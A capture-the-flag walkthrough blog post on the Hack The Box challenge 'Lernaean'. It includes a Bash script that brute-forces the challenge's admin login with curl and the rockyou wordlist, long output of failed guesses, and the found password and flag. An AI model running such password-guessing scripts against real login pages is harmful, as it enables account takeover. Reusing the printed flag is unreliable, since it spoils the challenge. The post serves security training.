# [Grav3m1ndbyte's Resources Blog](/index.html) > [HTB Machine Walkthroughs](/HTB-Machines.html)


![Grav3m1ndbyte HTB Badge](https://www.hackthebox.eu/badge/image/75471)





# Lernaean

![Lernaean Infocard](/images/Lernean.png)

**URL:** http://docker.hackthebox.eu:31027

## Overview

Not much of an "infocard" like with machines but at least you can see what it is about and the host and port to test. 

Basically, this challenge looks to be dynamic at first when you start testing the page. The goal is to try and "guess" the administrator password.


**Let's get started!**

## The Challenge

![Lernaean Page](/images/Lernean_Page.png)

At first glance, it doesn't look like much so I thought of looking at the source code, but not much either except for the password field where you can send a password through a HTTP POST Method. But we know this already!

```
<html>
<head>
    <title>Login - Lernaean</title>
</head>
<body style="background-color: #cd4e7b;">
    <center>
        <br><br><br>
        <h1><u>Administrator Login</u></h1>
        <h2>--- CONFIDENTIAL ---</h2>
        <h2>Please do not try to guess my password!</h2>
        <form method="POST">
            <input type="password" name="password"><br><br>
            <input type="submit" value="Submit">
        </form>
    </center>
</body>
</html>
```

But also, I thought of lookingfor anything interesting in the HTTP Request and Response, but nothing especial.

![Lernaean Page](/images/Lernean_headers.png)

Tried as well a basic SQL Injection but nothing either.

![Lernaean SQLi](/images/Lernean_headers_SQL.png)

![Lernaean SQLi 2](/images/Lernean_headers_SQL2.png)

At this point, I can try with a random passwword even though it didn't give me much above. I tried *test123*, but didn't get anything other than an *Invalid password!* message at the top.

![Lernaean Test 2](/images/Lernean_test_resp2.png)

```
Invalid password!
<html>
<head>
    <title>Login - Lernaean</title>
</head>
<body style="background-color: #cd4e7b;">
    <center>
        <br><br><br>
        <h1><u>Administrator Login</u></h1>
        <h2>--- CONFIDENTIAL ---</h2>
        <h2>Please do not try to guess my password!</h2>
        <form method="POST">
            <input type="password" name="password"><br><br>
            <input type="submit" value="Submit">
        </form>
    </center>
</body>
</html>
```

As you can see, the response didn't changed from before. Right now, I'm scratching my head and can only think of bruteforcing the page. What I'll do instead of relying on a tool, I will write my own Bash Script and see how far I can get to.

## Execution

The script will rely on using Curl and rockyou.txt. Also, the response will be sent to a file and will write over it through each iteration and compare the response against the word 'Invalid' from the previous response.

We know at this point we can send data to the password field in the HTTP Payload, so should be simple.

```
#!/bin/sh

ERROR="Invalid"
for PASS in $(cat /usr/share/wordlists/rockyou.txt)
do
        echo "\n### Testing password $PASS"

        (curl -X POST -d "password=$PASS" -s http://docker.hackthebox.eu:31027) > POST_Respose.txt

        grep -iq $ERROR ./POST_Respose.txt 
        if [ $? -ne 0 ]; then
                echo "\n"
                cat ./POST_Respose.txt
                exit 0;
        else
                echo "\nERROR: Invalid Password!"
        fi
done

```

### Output:

```
kali@back0ff:~/Documents/HTB-Challenges/Lernean$ ./lernean.sh 

### Testing password 123456

ERROR: Invalid Password!

### Testing password 12345

ERROR: Invalid Password!

### Testing password 123456789

ERROR: Invalid Password!

### Testing password password

ERROR: Invalid Password!

### Testing password iloveyou

ERROR: Invalid Password!

### Testing password princess

ERROR: Invalid Password!

### Testing password 1234567

ERROR: Invalid Password!

### Testing password rockyou

ERROR: Invalid Password!

### Testing password 12345678

ERROR: Invalid Password!

### Testing password abc123

ERROR: Invalid Password!

### Testing password nicole

ERROR: Invalid Password!

### Testing password daniel

ERROR: Invalid Password!

### Testing password babygirl

ERROR: Invalid Password!

### Testing password monkey

ERROR: Invalid Password!

### Testing password lovely

ERROR: Invalid Password!

### Testing password jessica

ERROR: Invalid Password!

### Testing password 654321

ERROR: Invalid Password!

### Testing password michael

ERROR: Invalid Password!

### Testing password ashley

ERROR: Invalid Password!

### Testing password qwerty

ERROR: Invalid Password!

### Testing password 111111

ERROR: Invalid Password!

### Testing password iloveu

ERROR: Invalid Password!

### Testing password 000000

ERROR: Invalid Password!

### Testing password michelle

ERROR: Invalid Password!

### Testing password tigger

ERROR: Invalid Password!

### Testing password sunshine

ERROR: Invalid Password!

### Testing password chocolate

ERROR: Invalid Password!

### Testing password password1

ERROR: Invalid Password!

### Testing password soccer

ERROR: Invalid Password!

### Testing password anthony

ERROR: Invalid Password!

### Testing password friends

ERROR: Invalid Password!

### Testing password butterfly

ERROR: Invalid Password!

### Testing password purple

ERROR: Invalid Password!

### Testing password angel

ERROR: Invalid Password!

### Testing password jordan

ERROR: Invalid Password!

### Testing password liverpool

ERROR: Invalid Password!

### Testing password justin

ERROR: Invalid Password!

### Testing password loveme

ERROR: Invalid Password!

### Testing password fuckyou

ERROR: Invalid Password!

### Testing password 123123

ERROR: Invalid Password!

### Testing password football

ERROR: Invalid Password!

### Testing password secret

ERROR: Invalid Password!

### Testing password andrea

ERROR: Invalid Password!

### Testing password carlos

ERROR: Invalid Password!

### Testing password jennifer

ERROR: Invalid Password!

### Testing password joshua

ERROR: Invalid Password!

### Testing password bubbles

ERROR: Invalid Password!

### Testing password 1234567890

ERROR: Invalid Password!

### Testing password superman

ERROR: Invalid Password!

### Testing password hannah

ERROR: Invalid Password!

### Testing password amanda

ERROR: Invalid Password!

### Testing password loveyou

ERROR: Invalid Password!

### Testing password pretty

ERROR: Invalid Password!

### Testing password basketball

ERROR: Invalid Password!

### Testing password andrew

ERROR: Invalid Password!

### Testing password angels

ERROR: Invalid Password!

### Testing password tweety

ERROR: Invalid Password!

### Testing password flower

ERROR: Invalid Password!

### Testing password playboy

ERROR: Invalid Password!

### Testing password hello

ERROR: Invalid Password!

### Testing password elizabeth

ERROR: Invalid Password!

### Testing password hottie

ERROR: Invalid Password!

### Testing password tinkerbell

ERROR: Invalid Password!

### Testing password charlie

ERROR: Invalid Password!

### Testing password samantha

ERROR: Invalid Password!

### Testing password barbie

ERROR: Invalid Password!

### Testing password chelsea

ERROR: Invalid Password!

### Testing password lovers

ERROR: Invalid Password!

### Testing password teamo

ERROR: Invalid Password!

### Testing password jasmine

ERROR: Invalid Password!

### Testing password brandon

ERROR: Invalid Password!

### Testing password 666666

ERROR: Invalid Password!

### Testing password shadow

ERROR: Invalid Password!

### Testing password melissa

ERROR: Invalid Password!

### Testing password eminem

ERROR: Invalid Password!

### Testing password matthew

ERROR: Invalid Password!

### Testing password robert

ERROR: Invalid Password!

### Testing password danielle

ERROR: Invalid Password!

### Testing password forever

ERROR: Invalid Password!

### Testing password family

ERROR: Invalid Password!

### Testing password jonathan

ERROR: Invalid Password!

### Testing password 987654321

ERROR: Invalid Password!

### Testing password computer

ERROR: Invalid Password!

### Testing password whatever

ERROR: Invalid Password!

### Testing password dragon

ERROR: Invalid Password!

### Testing password vanessa

ERROR: Invalid Password!

### Testing password cookie

ERROR: Invalid Password!

### Testing password naruto

ERROR: Invalid Password!

### Testing password summer

ERROR: Invalid Password!

### Testing password sweety

ERROR: Invalid Password!

### Testing password spongebob

ERROR: Invalid Password!

### Testing password joseph

ERROR: Invalid Password!

### Testing password junior

ERROR: Invalid Password!

### Testing password softball

ERROR: Invalid Password!

### Testing password taylor

ERROR: Invalid Password!

### Testing password yellow

ERROR: Invalid Password!

### Testing password daniela

ERROR: Invalid Password!

### Testing password lauren

ERROR: Invalid Password!

### Testing password mickey

ERROR: Invalid Password!

### Testing password princesa

ERROR: Invalid Password!

### Testing password alexandra

ERROR: Invalid Password!

### Testing password alexis

ERROR: Invalid Password!

### Testing password jesus

ERROR: Invalid Password!

### Testing password estrella

ERROR: Invalid Password!

### Testing password miguel

ERROR: Invalid Password!

### Testing password william

ERROR: Invalid Password!

### Testing password thomas

ERROR: Invalid Password!

### Testing password beautiful

ERROR: Invalid Password!

### Testing password mylove

ERROR: Invalid Password!

### Testing password angela

ERROR: Invalid Password!

### Testing password poohbear

ERROR: Invalid Password!

### Testing password patrick

ERROR: Invalid Password!

### Testing password iloveme

ERROR: Invalid Password!

### Testing password sakura

ERROR: Invalid Password!

### Testing password adrian

ERROR: Invalid Password!

### Testing password alexander

ERROR: Invalid Password!

### Testing password destiny

ERROR: Invalid Password!

### Testing password christian

ERROR: Invalid Password!

### Testing password 121212

ERROR: Invalid Password!

### Testing password sayang

ERROR: Invalid Password!

### Testing password america

ERROR: Invalid Password!

### Testing password dancer

ERROR: Invalid Password!

### Testing password monica

ERROR: Invalid Password!

### Testing password richard

ERROR: Invalid Password!

### Testing password 112233

ERROR: Invalid Password!

### Testing password princess1

ERROR: Invalid Password!

### Testing password 555555

ERROR: Invalid Password!

### Testing password diamond

ERROR: Invalid Password!

### Testing password carolina

ERROR: Invalid Password!

### Testing password steven

ERROR: Invalid Password!

### Testing password rangers

ERROR: Invalid Password!

### Testing password louise

ERROR: Invalid Password!

### Testing password orange

ERROR: Invalid Password!

### Testing password 789456

ERROR: Invalid Password!

### Testing password 999999

ERROR: Invalid Password!

### Testing password shorty

ERROR: Invalid Password!

### Testing password 11111

ERROR: Invalid Password!

### Testing password nathan

ERROR: Invalid Password!

### Testing password snoopy

ERROR: Invalid Password!

### Testing password gabriel

ERROR: Invalid Password!

### Testing password hunter

ERROR: Invalid Password!

### Testing password cherry

ERROR: Invalid Password!

### Testing password killer

ERROR: Invalid Password!

### Testing password sandra

ERROR: Invalid Password!

### Testing password alejandro

ERROR: Invalid Password!

### Testing password buster

ERROR: Invalid Password!

### Testing password george

ERROR: Invalid Password!

### Testing password brittany

ERROR: Invalid Password!

### Testing password alejandra

ERROR: Invalid Password!

### Testing password patricia

ERROR: Invalid Password!

### Testing password rachel

ERROR: Invalid Password!

### Testing password tequiero

ERROR: Invalid Password!

### Testing password 7777777

ERROR: Invalid Password!

### Testing password cheese

ERROR: Invalid Password!

### Testing password 159753

ERROR: Invalid Password!

### Testing password arsenal

ERROR: Invalid Password!

### Testing password dolphin

ERROR: Invalid Password!

### Testing password antonio

ERROR: Invalid Password!

### Testing password heather

ERROR: Invalid Password!

### Testing password david

ERROR: Invalid Password!

### Testing password ginger

ERROR: Invalid Password!

### Testing password stephanie

ERROR: Invalid Password!

### Testing password peanut

ERROR: Invalid Password!

### Testing password blink182

ERROR: Invalid Password!

### Testing password sweetie

ERROR: Invalid Password!

### Testing password 222222

ERROR: Invalid Password!

### Testing password beauty

ERROR: Invalid Password!

### Testing password 987654

ERROR: Invalid Password!

### Testing password victoria

ERROR: Invalid Password!

### Testing password honey

ERROR: Invalid Password!

### Testing password 00000

ERROR: Invalid Password!

### Testing password fernando

ERROR: Invalid Password!

### Testing password pokemon

ERROR: Invalid Password!

### Testing password maggie

ERROR: Invalid Password!

### Testing password corazon

ERROR: Invalid Password!

### Testing password chicken

ERROR: Invalid Password!

### Testing password pepper

ERROR: Invalid Password!

### Testing password cristina

ERROR: Invalid Password!

### Testing password rainbow

ERROR: Invalid Password!

### Testing password kisses

ERROR: Invalid Password!

### Testing password manuel

ERROR: Invalid Password!

### Testing password myspace

ERROR: Invalid Password!

### Testing password rebelde

ERROR: Invalid Password!

### Testing password angel1

ERROR: Invalid Password!

### Testing password ricardo

ERROR: Invalid Password!

### Testing password babygurl

ERROR: Invalid Password!

### Testing password heaven

ERROR: Invalid Password!

### Testing password 55555

ERROR: Invalid Password!

### Testing password baseball

ERROR: Invalid Password!

### Testing password martin

ERROR: Invalid Password!

### Testing password greenday

ERROR: Invalid Password!

### Testing password november

ERROR: Invalid Password!

### Testing password alyssa

ERROR: Invalid Password!

### Testing password madison

ERROR: Invalid Password!

### Testing password mother

ERROR: Invalid Password!

### Testing password 123321

ERROR: Invalid Password!

### Testing password 123abc

ERROR: Invalid Password!

### Testing password mahalkita

ERROR: Invalid Password!

### Testing password batman

ERROR: Invalid Password!

### Testing password september

ERROR: Invalid Password!

### Testing password december

ERROR: Invalid Password!

### Testing password morgan

ERROR: Invalid Password!

### Testing password mariposa

ERROR: Invalid Password!

### Testing password maria

ERROR: Invalid Password!

### Testing password gabriela

ERROR: Invalid Password!

### Testing password iloveyou2

ERROR: Invalid Password!

### Testing password bailey

ERROR: Invalid Password!

### Testing password jeremy

ERROR: Invalid Password!

### Testing password pamela

ERROR: Invalid Password!

### Testing password kimberly

ERROR: Invalid Password!

### Testing password gemini

ERROR: Invalid Password!

### Testing password shannon

ERROR: Invalid Password!

### Testing password pictures

ERROR: Invalid Password!

### Testing password asshole

ERROR: Invalid Password!

### Testing password sophie

ERROR: Invalid Password!

### Testing password jessie

ERROR: Invalid Password!

### Testing password hellokitty

ERROR: Invalid Password!

### Testing password claudia

ERROR: Invalid Password!

### Testing password babygirl1

ERROR: Invalid Password!

### Testing password angelica

ERROR: Invalid Password!

### Testing password austin

ERROR: Invalid Password!

### Testing password mahalko

ERROR: Invalid Password!

### Testing password victor

ERROR: Invalid Password!

### Testing password horses

ERROR: Invalid Password!

### Testing password tiffany

ERROR: Invalid Password!

### Testing password mariana

ERROR: Invalid Password!

### Testing password eduardo

ERROR: Invalid Password!

### Testing password andres

ERROR: Invalid Password!

### Testing password courtney

ERROR: Invalid Password!

### Testing password booboo

ERROR: Invalid Password!

### Testing password kissme

ERROR: Invalid Password!

### Testing password harley

ERROR: Invalid Password!

### Testing password ronaldo

ERROR: Invalid Password!

### Testing password iloveyou1

ERROR: Invalid Password!

### Testing password precious

ERROR: Invalid Password!

### Testing password october

ERROR: Invalid Password!

### Testing password inuyasha

ERROR: Invalid Password!

### Testing password peaches

ERROR: Invalid Password!

### Testing password veronica

ERROR: Invalid Password!

### Testing password chris

ERROR: Invalid Password!

### Testing password 888888

ERROR: Invalid Password!

### Testing password adriana

ERROR: Invalid Password!

### Testing password cutie

ERROR: Invalid Password!

### Testing password james

ERROR: Invalid Password!

### Testing password banana

ERROR: Invalid Password!

### Testing password prince

ERROR: Invalid Password!

### Testing password friend

ERROR: Invalid Password!

### Testing password jesus1

ERROR: Invalid Password!

### Testing password crystal

ERROR: Invalid Password!

### Testing password celtic

ERROR: Invalid Password!

### Testing password zxcvbnm

ERROR: Invalid Password!

### Testing password edward

ERROR: Invalid Password!

### Testing password oliver

ERROR: Invalid Password!

### Testing password diana

ERROR: Invalid Password!

### Testing password samsung

ERROR: Invalid Password!

### Testing password freedom

ERROR: Invalid Password!

### Testing password angelo

ERROR: Invalid Password!

### Testing password kenneth

ERROR: Invalid Password!

### Testing password master

ERROR: Invalid Password!

### Testing password scooby

ERROR: Invalid Password!

### Testing password carmen

ERROR: Invalid Password!

### Testing password 456789

ERROR: Invalid Password!

### Testing password sebastian

ERROR: Invalid Password!

### Testing password rebecca

ERROR: Invalid Password!

### Testing password jackie

ERROR: Invalid Password!

### Testing password spiderman

ERROR: Invalid Password!

### Testing password christopher

ERROR: Invalid Password!

### Testing password karina

ERROR: Invalid Password!

### Testing password johnny

ERROR: Invalid Password!

### Testing password hotmail

ERROR: Invalid Password!

### Testing password 0123456789

ERROR: Invalid Password!

### Testing password school

ERROR: Invalid Password!

### Testing password barcelona

ERROR: Invalid Password!

### Testing password august

ERROR: Invalid Password!

### Testing password orlando

ERROR: Invalid Password!

### Testing password samuel

ERROR: Invalid Password!

### Testing password cameron

ERROR: Invalid Password!

### Testing password slipknot

ERROR: Invalid Password!

### Testing password cutiepie

ERROR: Invalid Password!

### Testing password monkey1

ERROR: Invalid Password!

### Testing password 50cent

ERROR: Invalid Password!

### Testing password bonita

ERROR: Invalid Password!

### Testing password kevin

ERROR: Invalid Password!

### Testing password bitch

ERROR: Invalid Password!

### Testing password maganda

ERROR: Invalid Password!

### Testing password babyboy

ERROR: Invalid Password!

### Testing password casper

ERROR: Invalid Password!

### Testing password brenda

ERROR: Invalid Password!

### Testing password adidas

ERROR: Invalid Password!

### Testing password kitten

ERROR: Invalid Password!

### Testing password karen

ERROR: Invalid Password!

### Testing password mustang

ERROR: Invalid Password!

### Testing password isabel

ERROR: Invalid Password!

### Testing password natalie

ERROR: Invalid Password!

### Testing password cuteako

ERROR: Invalid Password!

### Testing password javier

ERROR: Invalid Password!

### Testing password 789456123

ERROR: Invalid Password!

### Testing password 123654

ERROR: Invalid Password!

### Testing password sarah

ERROR: Invalid Password!

### Testing password bowwow

ERROR: Invalid Password!

### Testing password portugal

ERROR: Invalid Password!

### Testing password laura

ERROR: Invalid Password!

### Testing password 777777

ERROR: Invalid Password!

### Testing password marvin

ERROR: Invalid Password!

### Testing password denise

ERROR: Invalid Password!

### Testing password tigers

ERROR: Invalid Password!

### Testing password volleyball

ERROR: Invalid Password!

### Testing password jasper

ERROR: Invalid Password!

### Testing password rockstar

ERROR: Invalid Password!

### Testing password january

ERROR: Invalid Password!

### Testing password fuckoff

ERROR: Invalid Password!

### Testing password alicia

ERROR: Invalid Password!

### Testing password nicholas

ERROR: Invalid Password!

### Testing password flowers

ERROR: Invalid Password!

### Testing password cristian

ERROR: Invalid Password!

### Testing password tintin

ERROR: Invalid Password!

### Testing password bianca

ERROR: Invalid Password!

### Testing password chrisbrown

ERROR: Invalid Password!

### Testing password chester

ERROR: Invalid Password!

### Testing password 101010

ERROR: Invalid Password!

### Testing password smokey

ERROR: Invalid Password!

### Testing password silver

ERROR: Invalid Password!

### Testing password internet

ERROR: Invalid Password!

### Testing password sweet

ERROR: Invalid Password!

### Testing password strawberry

ERROR: Invalid Password!

### Testing password garfield

ERROR: Invalid Password!

### Testing password dennis

ERROR: Invalid Password!

### Testing password panget

ERROR: Invalid Password!

### Testing password francis

ERROR: Invalid Password!

### Testing password cassie

ERROR: Invalid Password!

### Testing password benfica

ERROR: Invalid Password!

### Testing password love123

ERROR: Invalid Password!

### Testing password 696969

ERROR: Invalid Password!

### Testing password asdfgh

ERROR: Invalid Password!

### Testing password lollipop

ERROR: Invalid Password!

### Testing password olivia

ERROR: Invalid Password!

### Testing password cancer

ERROR: Invalid Password!

### Testing password camila

ERROR: Invalid Password!

### Testing password qwertyuiop

ERROR: Invalid Password!

### Testing password superstar

ERROR: Invalid Password!

### Testing password harrypotter

ERROR: Invalid Password!

### Testing password ihateyou

ERROR: Invalid Password!

### Testing password charles

ERROR: Invalid Password!

### Testing password monique

ERROR: Invalid Password!

### Testing password midnight

ERROR: Invalid Password!

### Testing password vincent

ERROR: Invalid Password!

### Testing password christine

ERROR: Invalid Password!

### Testing password apples

ERROR: Invalid Password!

### Testing password scorpio

ERROR: Invalid Password!

### Testing password jordan23

ERROR: Invalid Password!

### Testing password lorena

ERROR: Invalid Password!

### Testing password andreea

ERROR: Invalid Password!

### Testing password mercedes

ERROR: Invalid Password!

### Testing password katherine

ERROR: Invalid Password!

### Testing password charmed

ERROR: Invalid Password!

### Testing password abigail

ERROR: Invalid Password!

### Testing password rafael

ERROR: Invalid Password!

### Testing password icecream

ERROR: Invalid Password!

### Testing password mexico

ERROR: Invalid Password!

### Testing password brianna

ERROR: Invalid Password!

### Testing password nirvana

ERROR: Invalid Password!

### Testing password aaliyah

ERROR: Invalid Password!

### Testing password pookie

ERROR: Invalid Password!

### Testing password johncena

ERROR: Invalid Password!

### Testing password lovelove

ERROR: Invalid Password!

### Testing password fucker

ERROR: Invalid Password!

### Testing password abcdef

ERROR: Invalid Password!

### Testing password benjamin

ERROR: Invalid Password!

### Testing password 131313

ERROR: Invalid Password!

### Testing password gangsta

ERROR: Invalid Password!

### Testing password brooke

ERROR: Invalid Password!

### Testing password 333333

ERROR: Invalid Password!

### Testing password hiphop

ERROR: Invalid Password!

### Testing password aaaaaa

ERROR: Invalid Password!

### Testing password mybaby

ERROR: Invalid Password!

### Testing password sergio

ERROR: Invalid Password!

### Testing password welcome

ERROR: Invalid Password!

### Testing password metallica

ERROR: Invalid Password!

### Testing password julian

ERROR: Invalid Password!

### Testing password travis

ERROR: Invalid Password!

### Testing password myspace1

ERROR: Invalid Password!

### Testing password babyblue

ERROR: Invalid Password!

### Testing password sabrina

ERROR: Invalid Password!

### Testing password michael1

ERROR: Invalid Password!

### Testing password jeffrey

ERROR: Invalid Password!

### Testing password stephen

ERROR: Invalid Password!

### Testing password love

ERROR: Invalid Password!

### Testing password dakota

ERROR: Invalid Password!

### Testing password catherine

ERROR: Invalid Password!

### Testing password badboy

ERROR: Invalid Password!

### Testing password fernanda

ERROR: Invalid Password!

### Testing password westlife

ERROR: Invalid Password!

### Testing password blondie

ERROR: Invalid Password!

### Testing password sasuke

ERROR: Invalid Password!

### Testing password smiley

ERROR: Invalid Password!

### Testing password jackson

ERROR: Invalid Password!

### Testing password simple

ERROR: Invalid Password!

### Testing password melanie

ERROR: Invalid Password!

### Testing password steaua

ERROR: Invalid Password!

### Testing password dolphins

ERROR: Invalid Password!

### Testing password roberto

ERROR: Invalid Password!

### Testing password fluffy

ERROR: Invalid Password!

### Testing password teresa

ERROR: Invalid Password!

### Testing password piglet

ERROR: Invalid Password!

### Testing password ronald

ERROR: Invalid Password!

### Testing password slideshow

ERROR: Invalid Password!

### Testing password asdfghjkl

ERROR: Invalid Password!

### Testing password minnie

ERROR: Invalid Password!

### Testing password newyork

ERROR: Invalid Password!

### Testing password jason

ERROR: Invalid Password!

### Testing password raymond

ERROR: Invalid Password!

### Testing password santiago

ERROR: Invalid Password!

### Testing password jayson

ERROR: Invalid Password!

### Testing password 88888888

ERROR: Invalid Password!

### Testing password 5201314

ERROR: Invalid Password!

### Testing password jerome

ERROR: Invalid Password!

### Testing password gandako

ERROR: Invalid Password!

### Testing password muffin

ERROR: Invalid Password!

### Testing password gatita

ERROR: Invalid Password!

### Testing password babyko

ERROR: Invalid Password!

### Testing password 246810

ERROR: Invalid Password!

### Testing password sweetheart

ERROR: Invalid Password!

### Testing password chivas

ERROR: Invalid Password!

### Testing password ladybug

ERROR: Invalid Password!

### Testing password kitty

ERROR: Invalid Password!

### Testing password popcorn

ERROR: Invalid Password!

### Testing password alberto

ERROR: Invalid Password!

### Testing password valeria

ERROR: Invalid Password!

### Testing password cookies

ERROR: Invalid Password!

### Testing password leslie

ERROR: Invalid Password!

### Testing password jenny

ERROR: Invalid Password!

### Testing password nicole1

ERROR: Invalid Password!

### Testing password 12345678910

ERROR: Invalid Password!
```

### Flag:

AND right after testing with *12345678910*, it tests **leonardo** which seems to be the password. See below:

```
### Testing password leonardo


<h1 style='color: #fff;'>HTB{l1k3_4_b0s5_s0n}</h1><script type="text/javascript">
                   window.location = "noooooooope.html"
              </script>
<html>
<head>
    <title>Login - Lernaean</title>
</head>
<body style="background-color: #cd4e7b;">
    <center>
        <br><br><br>
        <h1><u>Administrator Login</u></h1>
        <h2>--- CONFIDENTIAL ---</h2>
        <h2>Please do not try to guess my password!</h2>
        <form method="POST">
            <input type="password" name="password"><br><br>
            <input type="submit" value="Submit">
        </form>
    </center>
</body>
</html>
```

As you notice in the response, we got the flag which is **HTB{l1k3_4_b0s5_s0n}**

Hope you all enjoyed this!





